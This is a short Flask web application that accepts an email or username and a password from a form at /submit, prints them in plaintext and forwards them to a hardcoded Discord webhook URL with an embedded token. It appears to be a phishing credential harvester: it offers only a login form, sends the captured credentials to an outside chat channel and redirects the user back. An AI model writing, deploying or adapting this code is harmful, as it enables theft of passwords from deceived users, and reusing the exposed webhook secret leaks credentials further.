import os
import traceback
import requests
from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

@app.errorhandler(Exception)
def handle_error(e):
    print("ERROR:", str(e))
    print(traceback.format_exc())
    raise

WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL") or "https://discord.com/api/webhooks/1469266906732167322/dJoNR9sFkYeJo2s1nidZjrdlJ9lx16zWLLxNXYsib2FC3tdNo-eyJVGhtxME_OxN4v5L"

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    email = request.form.get("email")
    password = request.form.get("password")

    data = {
        "Email / Username": email,
        "Password": password,
    }

    print("--- Form submitted ---")
    for key, value in data.items():
        print(f"{key}: {value}")
    print("---")

    if WEBHOOK_URL:
        content = "\n".join(f"**{k}:** {v}" for k, v in data.items())
        payload = {
            "content": f"**New form submission**\n\n{content}"
        }
        try:
            requests.post(WEBHOOK_URL, json=payload)
        except Exception as e:
            print(f"Discord webhook error: {e}")

    return redirect(url_for("index"))

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
